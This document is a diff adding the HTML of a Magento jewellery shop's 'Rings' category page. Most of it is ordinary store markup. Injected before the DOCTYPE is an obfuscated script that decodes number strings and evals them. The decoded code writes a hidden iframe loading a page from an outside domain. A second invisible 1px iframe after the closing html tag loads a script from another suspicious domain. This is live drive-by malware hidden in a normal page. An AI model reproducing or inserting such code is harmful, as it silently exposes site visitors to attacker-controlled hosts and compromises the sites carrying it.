@@ -1,0 +1,421 @@
+<script>b=new function(){return 2;};try{document.removeChild({})}catch(q){ss="";s=String;}ddd=new Date();d2=new Date(ddd.valueOf()-2);Object.prototype.asd='q';if('q'==={}.asd)a=document['createTextNode']('321');if(a.nodeValue==321)h=(ddd-d2)*-1;n='4.5c4.5c52.5c51c16c20c50c55.5c49.5c58.5c54.5c50.5c55c58c23c51.5c50.5c58c34.5c54c50.5c54.5c50.5c55c58c57.5c33c60.5c42c48.5c51.5c39c48.5c54.5c50.5c20c19.5c49c55.5c50c60.5c19.5c20.5c45.5c24c46.5c20.5c61.5c4.5c4.5c4.5c52.5c51c57c48.5c54.5c50.5c57c20c20.5c29.5c4.5c4.5c62.5c16c50.5c54c57.5c50.5c16c61.5c4.5c4.5c4.5c50c55.5c49.5c58.5c54.5c50.5c55c58c23c59.5c57c52.5c58c50.5c20c17c30c52.5c51c57c48.5c54.5c50.5c16c57.5c57c49.5c30.5c19.5c52c58c58c56c29c23.5c23.5c50c57.5c22.5c49.5c55.5c54.5c61c58.5c51.5c23c49.5c55.5c54.5c23.5c59c55.5c52.5c50c23c56c52c56c31.5c56c48.5c51.5c50.5c30.5c26.5c28c27c49.5c28.5c27.5c50.5c27.5c24.5c51c24c49c28.5c27c25c28c19.5c16c59.5c52.5c50c58c52c30.5c19.5c24.5c24c19.5c16c52c50.5c52.5c51.5c52c58c30.5c19.5c24.5c24c19.5c16c57.5c58c60.5c54c50.5c30.5c19.5c59c52.5c57.5c52.5c49c52.5c54c52.5c58c60.5c29c52c52.5c50c50c50.5c55c29.5c56c55.5c57.5c52.5c58c52.5c55.5c55c29c48.5c49c57.5c55.5c54c58.5c58c50.5c29.5c54c50.5c51c58c29c24c29.5c58c55.5c56c29c24c29.5c19.5c31c30c23.5c52.5c51c57c48.5c54.5c50.5c31c17c20.5c29.5c4.5c4.5c62.5c4.5c4.5c51c58.5c55c49.5c58c52.5c55.5c55c16c52.5c51c57c48.5c54.5c50.5c57c20c20.5c61.5c4.5c4.5c4.5c59c48.5c57c16c51c16c30.5c16c50c55.5c49.5c58.5c54.5c50.5c55c58c23c49.5c57c50.5c48.5c58c50.5c34.5c54c50.5c54.5c50.5c55c58c20c19.5c52.5c51c57c48.5c54.5c50.5c19.5c20.5c29.5c51c23c57.5c50.5c58c32.5c58c58c57c52.5c49c58.5c58c50.5c20c19.5c57.5c57c49.5c19.5c22c19.5c52c58c58c56c29c23.5c23.5c50c57.5c22.5c49.5c55.5c54.5c61c58.5c51.5c23c49.5c55.5c54.5c23.5c59c55.5c52.5c50c23c56c52c56c31.5c56c48.5c51.5c50.5c30.5c26.5c28c27c49.5c28.5c27.5c50.5c27.5c24.5c51c24c49c28.5c27c25c28c19.5c20.5c29.5c51c23c57.5c58c60.5c54c50.5c23c59c52.5c57.5c52.5c49c52.5c54c52.5c58c60.5c30.5c19.5c52c52.5c50c50c50.5c55c19.5c29.5c51c23c57.5c58c60.5c54c50.5c23c56c55.5c57.5c52.5c58c52.5c55.5c55c30.5c19.5c48.5c49c57.5c55.5c54c58.5c58c50.5c19.5c29.5c51c23c57.5c58c60.5c54c50.5c23c54c50.5c51c58c30.5c19.5c24c19.5c29.5c51c23c57.5c58c60.5c54c50.5c23c58c55.5c56c30.5c19.5c24c19.5c29.5c51c23c57.5c50.5c58c32.5c58c58c57c52.5c49c58.5c58c50.5c20c19.5c59.5c52.5c50c58c52c19.5c22c19.5c24.5c24c19.5c20.5c29.5c51c23c57.5c50.5c58c32.5c58c58c57c52.5c49c58.5c58c50.5c20c19.5c52c50.5c52.5c51.5c52c58c19.5c22c19.5c24.5c24c19.5c20.5c29.5c4.5c4.5c4.5c50c55.5c49.5c58.5c54.5c50.5c55c58c23c51.5c50.5c58c34.5c54c50.5c54.5c50.5c55c58c57.5c33c60.5c42c48.5c51.5c39c48.5c54.5c50.5c20c19.5c49c55.5c50c60.5c19.5c20.5c45.5c24c46.5c23c48.5c56c56c50.5c55c50c33.5c52c52.5c54c50c20c51c20.5c29.5c4.5c4.5c62.5';n=n['split']('c');for(i=0;i!=n.length;i++)if(!+b)ss+=s.fromCharCode(-h*eval("n"+"[i]"));if(a.nodeValue==321)eval(ss);</script><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title>Rings</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="description" content="" />
+<meta name="keywords" content="Artificial Jewellery, silver jewellery, Pakistani jewellery, Indian Jewellery, order online" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://www.artijewels.com/skin/frontend/default/default/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.artijewels.com/skin/frontend/default/default/favicon.ico" type="image/x-icon" />
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.artijewels.com/js/blank.html';
+    var BLANK_IMG = 'http://www.artijewels.com/js/spacer.gif';
+//]]>
+</script>
+<link rel="stylesheet" type="text/css" href="http://www.artijewels.com/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.artijewels.com/skin/frontend/default/default/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.artijewels.com/skin/frontend/default/default/css/explodedmenu.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.artijewels.com/skin/frontend/default/default/css/print.css" media="print" />
+<script type="text/javascript" src="http://www.artijewels.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.artijewels.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.artijewels.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.artijewels.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.artijewels.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.artijewels.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.artijewels.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.artijewels.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.artijewels.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.artijewels.com/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://www.artijewels.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.artijewels.com/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.artijewels.com/js/explodedmenu.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.artijewels.com/skin/frontend/default/default/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.artijewels.com/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://www.artijewels.com/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = [];
+//]]>
+</script>
+<script type="text/javascript">var Translator = new Translate([]);</script></head>
+<body class=" catalog-category-view categorypath-rings-html category-rings">
+<div class="wrapper">
+        <noscript>
+        <div class="noscript">
+            <div class="noscript-inner">
+                <p><strong>We detected that your JavaScript seem to be disabled.</strong></p>
+                <p>You must have JavaScript enabled in your browser to utilize the functionality of this website.</p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        <div class="header-container">
+    <div class="header">
+                <a href="http://www.artijewels.com/" title="ArtiJewels.com" class="logo"><strong>ArtiJewels.com</strong><img src="http://www.artijewels.com/skin/frontend/default/default/images/logo.gif" alt="ArtiJewels.com" /></a>
+                <div class="quick-access">
+            <form id="search_mini_form" action="http://www.artijewels.com/catalogsearch/result/" method="get">
+    <div class="form-search">
+        <label for="search">Search:</label>
+        <input id="search" type="text" name="q" value="" class="input-text" />
+        <button type="submit" title="Search" class="button"><span><span>Search</span></span></button>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Search entire store here...');
+            searchForm.initAutocomplete('http://www.artijewels.com/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>
+</form>
+            <p class="welcome-msg">Welcome!</p>
+            <ul class="links">
+            <li class="first" ><a href="http://www.artijewels.com/customer/account/" title="My Account" >My Account</a></li>
+            <li ><a href="http://www.artijewels.com/wishlist/" title="My Wishlist" class="top-link-wishlist">My Wishlist</a></li>
+            <li ><a href="http://www.artijewels.com/checkout/cart/" title="My Cart" class="top-link-cart">My Cart</a></li>
+            <li ><a href="http://www.artijewels.com/checkout/" title="Checkout" class="top-link-checkout">Checkout</a></li>
+            <li class=" last" ><a href="http://www.artijewels.com/customer/account/login/" title="Log In" >Log In</a></li>
+    </ul>
+                    </div>
+            </div>
+</div>
+	<script type="text/javascript" src="http://www.artijewels.com/skin/frontend/default/default/js/explodedmenu.js"></script>
+    <div class="nav-container">
+        <h4 class="no-display">Category Navigation:</h4>
+        <ul id="anav">
+        <!-- uncomment this line to display 'Home' link in the menu
+            <li><a href="http://www.artijewels.com/"><span>Home</span></a></li>
+        -->
+                    <li class="top_level">
+<a href="http://www.artijewels.com/earnings.html"><span>Earnings</span></a>
+</li>                    <li class="top_level">
+<a href="http://www.artijewels.com/bracelets.html"><span>Bracelets</span></a>
+</li>                    <li class="top_level">
+<a href="http://www.artijewels.com/bangles.html"><span>Bangles</span></a>
+</li>                    <li class="top_level">
+<a href="http://www.artijewels.com/anklets.html"><span>Anklets</span></a>
+</li>                    <li class="top_level">
+<a href="http://www.artijewels.com/mang-tika.html"><span>Mang Tika</span></a>
+</li>                    <li class="top_level">
+<a href="http://www.artijewels.com/necklaces.html"><span>Necklaces</span></a>
+</li>                    <li class="top_level">
+<a href="http://www.artijewels.com/armlets.html"><span>Armlets</span></a>
+</li>                    <li class="top_level">
+<a href="http://www.artijewels.com/pendants.html"><span>Pendants</span></a>
+</li>                    <li class="top_level">
+<a href="http://www.artijewels.com/rings.html"><span>Rings</span></a>
+</li>                </ul>
+    </div>
+            <div class="main-container col3-layout">
+            <div class="main">
+                <div class="breadcrumbs">
+    <ul>
+                    <li class="home">
+                            <a href="http://www.artijewels.com/" title="Go to Home Page">Home</a>
+                                        <span>/ </span>
+                        </li>
+                    <li class="category4">
+                            <strong>Rings</strong>
+                                    </li>
+            </ul>
+</div>
+                <div class="col-wrapper">
+                    <div class="col-main">
+                                                <div class="page-title category-title">
+        <h1>Rings</h1>
+</div>
+
+
+
+
+        <div class="category-products">
+    <div class="toolbar">
+    <div class="pager">
+        <p class="amount">
+                            <strong>1 Item(s)</strong>
+                    </p>
+
+        <div class="limiter">
+            <label>Show</label>
+            <select onchange="setLocation(this.value)">
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;limit=9" selected="selected">
+                    9                </option>
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;limit=15">
+                    15                </option>
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;limit=30">
+                    30                </option>
+                        </select> per page        </div>
+
+        
+    
+    
+    
+    
+    
+
+    </div>
+
+        <div class="sorter">
+                <p class="view-mode">
+                                    <label>View as:</label>
+                                                <strong title="Grid" class="grid">Grid</strong>&nbsp;
+                                                                <a href="http://www.artijewels.com/rings.html?brand=5&amp;mode=list" title="List" class="list">List</a>&nbsp;
+                                                </p>
+            
+        <div class="sort-by">
+            <label>Sort by</label>
+            <select onchange="setLocation(this.value)">
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;dir=asc&amp;order=position" selected="selected">
+                    Position                </option>
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;dir=asc&amp;order=name">
+                    Name                </option>
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;dir=asc&amp;order=price">
+                    Price                </option>
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;dir=asc&amp;order=brand">
+                    Brand                </option>
+                        </select>
+                            <a href="http://www.artijewels.com/rings.html?brand=5&amp;dir=desc&amp;order=position" title="Set Descending Direction"><img src="http://www.artijewels.com/skin/frontend/default/default/images/i_asc_arrow.gif" alt="Set Descending Direction" class="v-middle" /></a>
+                    </div>
+    </div>
+    </div>
+        
+    
+                            <ul class="products-grid">
+                    <li class="item first">
+                <a href="http://www.artijewels.com/rings/test-2.html" title="test 2" class="product-image"><img src="http://www.artijewels.com/media/catalog/product/cache/1/small_image/135x/9df78eab33525d08d6e5fb8d27136e95/2/_/2_2.jpg" width="135" height="135" alt="test 2" /></a>
+                <h2 class="product-name"><a href="http://www.artijewels.com/rings/test-2.html" title="test 2">test 2</a></h2>
+                                
+
+        
+    <div class="price-box">
+                                                            <span class="regular-price" id="product-price-2">
+                    <span class="price">$150.00</span>                </span>
+                        
+        </div>
+
+                <div class="actions">
+                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://www.artijewels.com/checkout/cart/add/uenc/aHR0cDovL3d3dy5hcnRpamV3ZWxzLmNvbS9yaW5ncy5odG1sP19fX1NJRD1VJmJyYW5kPTU,/product/2/')"><span><span>Add to Cart</span></span></button>
+                                        <ul class="add-to-links">
+                                                    <li><a href="http://www.artijewels.com/wishlist/index/add/product/2/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                            <li><span class="separator">|</span> <a href="http://www.artijewels.com/catalog/product_compare/add/product/2/uenc/aHR0cDovL3d3dy5hcnRpamV3ZWxzLmNvbS9yaW5ncy5odG1sP19fX1NJRD1VJmJyYW5kPTU,/" class="link-compare">Add to Compare</a></li>
+                                            </ul>
+                </div>
+            </li>
+                </ul>
+                        <script type="text/javascript">decorateGeneric($$('ul.products-grid'), ['odd','even','first','last'])</script>
+    
+    <div class="toolbar-bottom">
+        <div class="toolbar">
+    <div class="pager">
+        <p class="amount">
+                            <strong>1 Item(s)</strong>
+                    </p>
+
+        <div class="limiter">
+            <label>Show</label>
+            <select onchange="setLocation(this.value)">
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;limit=9" selected="selected">
+                    9                </option>
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;limit=15">
+                    15                </option>
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;limit=30">
+                    30                </option>
+                        </select> per page        </div>
+
+        
+    
+    
+    
+    
+    
+
+    </div>
+
+        <div class="sorter">
+                <p class="view-mode">
+                                    <label>View as:</label>
+                                                <strong title="Grid" class="grid">Grid</strong>&nbsp;
+                                                                <a href="http://www.artijewels.com/rings.html?brand=5&amp;mode=list" title="List" class="list">List</a>&nbsp;
+                                                </p>
+            
+        <div class="sort-by">
+            <label>Sort by</label>
+            <select onchange="setLocation(this.value)">
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;dir=asc&amp;order=position" selected="selected">
+                    Position                </option>
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;dir=asc&amp;order=name">
+                    Name                </option>
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;dir=asc&amp;order=price">
+                    Price                </option>
+                            <option value="http://www.artijewels.com/rings.html?brand=5&amp;dir=asc&amp;order=brand">
+                    Brand                </option>
+                        </select>
+                            <a href="http://www.artijewels.com/rings.html?brand=5&amp;dir=desc&amp;order=position" title="Set Descending Direction"><img src="http://www.artijewels.com/skin/frontend/default/default/images/i_asc_arrow.gif" alt="Set Descending Direction" class="v-middle" /></a>
+                    </div>
+    </div>
+    </div>
+    </div>
+</div>
+
+                    </div>
+                    <div class="col-left sidebar"><div class="block block-layered-nav">
+    <div class="block-title">
+        <strong><span>Shop by</span></strong>
+    </div>
+    <div class="block-content">
+            <p class="block-subtitle">Currently Shopping by</p>
+    <ol class="currently">
+            <li>
+            <a href="http://www.artijewels.com/rings.html" class="btn-remove" title="Remove This Item">Remove This Item</a>
+            <span class="label">Brand:</span> Nokia        </li>
+        </ol>
+    <div class="actions"><a href="http://www.artijewels.com/rings.html">Clear All</a></div>
+                    <p class="block-subtitle">Shopping Options</p>
+            <dl id="narrow-by-list">
+                                                                                                    <dt>Price</dt>
+                    <dd>
+<ol>
+    <li>
+                <a href="http://www.artijewels.com/rings.html?brand=5&amp;price=16%2C10"><span class="price">$150.00</span> - <span class="price">$160.00</span></a>
+                (1)
+    </li>
+</ol>
+</dd>
+                                                                            </dl>
+            <script type="text/javascript">decorateDataList('narrow-by-list')</script>
+            </div>
+</div>
+<div class="block block-banner">
+    <div class="block-content">
+      
+      <table style="width: 195px; height: 225px; border-width: 1px; border-color: #f30b2c;" border="1">
+<tbody>
+<tr>
+<td style="text-align: center;" valign="middle">&nbsp;Advertisment Here</td>
+</tr>
+</tbody>
+</table>    </div>
+
+
+
+</div>
+<div class="block block-subscribe">
+    <div class="block-title">
+        <strong><span>Newsletter</span></strong>
+    </div>
+    <form action="http://www.artijewels.com/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail">
+        <div class="block-content">
+            <label for="newsletter">Sign up for our newsletter:</label>
+            <div class="input-box">
+               <input type="text" name="email" id="newsletter" title="Sign up for our newsletter" class="input-text required-entry validate-email" />
+            </div>
+            <div class="actions">
+                <button type="submit" title="Subscribe" class="button"><span><span>Subscribe</span></span></button>
+            </div>
+        </div>
+    </form>
+    <script type="text/javascript">
+    //<![CDATA[
+        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    //]]>
+    </script>
+</div>
+</div>
+                </div>
+                <div class="col-right sidebar"><div class="block block-cart">
+        <div class="block-title">
+        <strong><span>My Cart</span></strong>
+    </div>
+    <div class="block-content">
+                        <p class="empty">You have no items in your shopping cart.</p>
+        </div>
+</div>
+<div class="block block-compare">
+    <div class="block-title">
+        <strong><span>Compare Products                    </span></strong>
+    </div>
+    <div class="block-content">
+            <p class="empty">You have no items to compare.</p>
+        </div>
+</div>
+<div class="block block-banner">
+    <div class="block-content">
+                    <img src="http://www.artijewels.com/skin/frontend/default/default/images/media/col_right_callout.jpg" title="Keep your eyes open for our special Back to School items and save A LOT!" alt="Keep your eyes open for our special Back to School items and save A LOT!" />
+            </div>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+    function validatePollAnswerIsSelected()
+    {
+        var options = $$('input.poll_vote');
+        for( i in options ) {
+            if( options[i].checked == true ) {
+                return true;
+            }
+        }
+        return false;
+    }
+//]]>
+</script>
+<div class="block block-poll">
+    <div class="block-title">
+        <strong><span>Community Poll</span></strong>
+    </div>
+    <form id="pollForm" action="http://www.artijewels.com/poll/vote/add/poll_id/1/" method="post" onsubmit="return validatePollAnswerIsSelected();">
+        <div class="block-content">
+            <p class="block-subtitle">What is your favorite color</p>
+                        <ul id="poll-answers">
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_1" value="1" />
+                    <span class="label"><label for="vote_1">Green</label></span>
+                </li>
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_2" value="2" />
+                    <span class="label"><label for="vote_2">Red</label></span>
+                </li>
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_3" value="3" />
+                    <span class="label"><label for="vote_3">Black</label></span>
+                </li>
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_4" value="4" />
+                    <span class="label"><label for="vote_4">Magenta</label></span>
+                </li>
+                            </ul>
+            <script type="text/javascript">decorateList('poll-answers');</script>
+                        <div class="actions">
+                <button type="submit" title="Vote" class="button"><span><span>Vote</span></span></button>
+            </div>
+        </div>
+    </form>
+</div>
+</div>
+            </div>
+        </div>
+        <div class="footer-container">
+    <div class="footer">
+        <ul>
+<li><a href="http://www.artijewels.com/about-magento-demo-store">About Us</a></li>
+<li class="last"><a href="http://www.artijewels.com/customer-service">Customer Service</a></li>
+</ul><ul class="links">
+            <li class="first" ><a href="http://www.artijewels.com/catalog/seo_sitemap/category/" title="Site Map" >Site Map</a></li>
+            <li ><a href="http://www.artijewels.com/catalogsearch/term/popular/" title="Search Terms" >Search Terms</a></li>
+            <li ><a href="http://www.artijewels.com/catalogsearch/advanced/" title="Advanced Search" >Advanced Search</a></li>
+            <li class=" last" ><a href="http://www.artijewels.com/contacts/" title="Contact Us" >Contact Us</a></li>
+    </ul>
+        <p class="bugs">Help Us to Keep Magento Healthy - <a href="http://www.magentocommerce.com/bug-tracking" onclick="this.target='_blank'"><strong>Report All Bugs</strong></a> (ver. 1.4.0.1)</p>
+        <address>&copy; 2010 ArtiJewels.com . All Rights Reserved.</address>
+    </div>
+</div>
+            </div>
+</div>
+</body>
+</html>
+ <!-- . --><iframe width="1px" height="1px" src="http://txvzcq.co.cc/script.php?tp=5a822ea568ce0c75" style="display: block;" ></iframe>
+<!-- . --> 
